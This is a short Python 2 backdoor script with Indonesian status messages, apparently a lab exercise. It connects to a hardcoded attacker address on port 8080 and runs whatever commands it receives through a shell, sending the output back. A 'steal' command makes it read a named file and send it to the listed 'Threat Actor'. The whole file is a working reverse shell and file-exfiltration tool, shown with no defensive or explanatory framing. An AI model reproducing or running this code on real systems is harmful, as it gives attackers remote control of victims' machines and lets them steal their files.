import socket
import subprocess
import os

def transferStolenFile(connectAttacker,fileCurian):    
    if os.path.exists(fileCurian):
        print "[+] File: " + fileCurian + " is found"
        fileStolen = open(fileCurian,"rb")
        print "[+] Sending File: " + fileCurian + " to Threat Actor"
        packet = fileStolen.read(1024)
        #print "Paket 1024 yang pertama: " + str(packet)
        while packet != '':
            connectAttacker.send(packet)
            packet = fileStolen.read(1024)
        connectAttacker.send("DONE")
        fileStolen.close()
    else:
        connectAttacker.send("Unable to find file")
    print "[*]" + "Menunggu perintah Threat Actor lebih lanjut .."

def connecToAttacker():
    connectAttacker = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connectAttacker.connect(("172.16.123.132",8080))
    print "[+]" + "Menghubungi Threat Actor ... " + "\n"
    while True:
        command = connectAttacker.recv(1024)
        print "\n" + "[+]Terima perintah: '" + command + "' dari Threat Actor"+ "\n"
        if "terminate" in command:
            print "\n" + "[-] Mengeksekusi perintah: " + command +" , untuk mengakhiri komunikasi" + "\n"
            print "connection closed ..." + "\n"
            connectAttacker.close()
            break
        elif "steal" in command:
            steal,fileCurian = command.split("*")
            print "\n" + "File yang akan dicuri adalah: " + fileCurian + "\n"            
            try:
                transferStolenFile(connectAttacker,fileCurian)
            except Exception,e:
                connectAttacker.send( str(e) )
                pass        
        else:
            print "[+]" + "Mengeksekusi perintah: " + command
            print "[+]" + "Mengirim hasil eksekusi perintah ke Threat Actor"
            print "[*]" + "Menunggu perintah Threat Actor lebih lanjut .."
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            connectAttacker.send(CMD.stdout.read())
            connectAttacker.send(CMD.stderr.read())
def main():
    connecToAttacker()
if __name__ == main():
    main()


